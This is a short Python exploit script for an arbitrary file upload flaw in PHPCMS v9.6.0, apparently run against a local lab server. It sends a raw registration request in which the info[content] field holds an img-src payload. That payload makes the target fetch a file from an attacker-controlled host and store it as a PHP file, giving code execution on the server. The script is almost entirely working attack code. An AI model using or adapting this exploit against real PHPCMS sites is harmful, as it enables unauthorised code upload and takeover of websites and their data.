import HackRequests

def name():
    return "PHPCMSv9.6.0任意文件上传漏洞"

def poc(url_1,url_2):
    header=f'''GET {url_1}index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1
Host: 192.168.0.107
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Length: 451
Origin: {url_1}
Connection: close
Referer: {url_1}index.php?m=member&c=index&a=register&siteid=1
Upgrade-Insecure-Requests: 1
'''
    return header
def ask(url_1,url_2):
    proxy= ('127.0.0.1','8080')

    header = f'''
POST /phpcms_v9.6.0_UTF8/install_package/index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1
Host: 192.168.0.107
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Length: 257
Origin: {url_1}
Connection: close
Referer: {url_1}/phpcms_v9.6.0_UTF8/install_package/index.php?m=member&c=index&a=register&siteid=1
Upgrade-Insecure-Requests: 1

siteid=1&modelid=11&username=test2&password=test2123&email=test2@163.com&info[content]=<img src={url_2}?.php#.jpg>&dosubmit=1&protocol=
'''
    print(header)
    #header=poc(url_1,url_2)

    hack=HackRequests.hackRequests()
    html=hack.httpraw(header)
    print(html.text())
ask('http://192.168.0.107/phpcms_v9.6.0_UTF8/install_package','http://192.168.0.106/phpinfo.txt')